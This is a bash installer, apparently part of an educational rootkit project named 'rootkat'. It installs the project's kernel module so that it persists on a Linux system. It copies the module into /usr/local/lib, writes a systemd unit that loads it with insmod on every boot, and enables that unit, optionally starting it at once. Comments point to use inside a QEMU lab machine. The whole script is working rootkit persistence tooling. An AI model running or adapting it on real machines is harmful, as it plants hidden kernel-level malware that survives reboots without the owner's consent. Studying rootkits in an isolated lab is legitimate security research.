#!/usr/bin/env bash
# Install rootkat persistently on the running system.
#   - Copies rootkat.ko to /usr/local/lib/rootkat/
#   - Writes /etc/systemd/system/rootkat-lkm.service that insmods on boot
#   - Enables the service (does NOT start it; let next boot do it, or
#     pass --now to start immediately)
#
# Run as root. Source tree assumed accessible (e.g. via the QEMU 9p mount
# at /root/rootkat). Idempotent: re-running updates files in place.
set -euo pipefail

SOURCE_KO="${SOURCE_KO:-/root/rootkat/lkm/rootkat.ko}"
INSTALL_DIR="/usr/local/lib/rootkat"
UNIT_PATH="/etc/systemd/system/rootkat-lkm.service"

if [ ! -f "$SOURCE_KO" ]; then
    echo "FATAL: $SOURCE_KO not found — build first" >&2
    exit 1
fi

mkdir -p "$INSTALL_DIR"
install -m 0644 "$SOURCE_KO" "$INSTALL_DIR/rootkat.ko"

cat > "$UNIT_PATH" <<'UNIT'
[Unit]
Description=rootkat LKM (educational rootkit auto-loader)
DefaultDependencies=no
After=local-fs.target sysinit.target
Before=multi-user.target

[Service]
Type=oneshot
ExecStart=/sbin/insmod /usr/local/lib/rootkat/rootkat.ko
ExecStop=/sbin/rmmod rootkat
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
UNIT
chmod 0644 "$UNIT_PATH"

systemctl daemon-reload
systemctl enable rootkat-lkm.service

if [ "${1:-}" = "--now" ]; then
    systemctl start rootkat-lkm.service
fi

echo "[install] rootkat installed at $INSTALL_DIR; enabled rootkat-lkm.service"
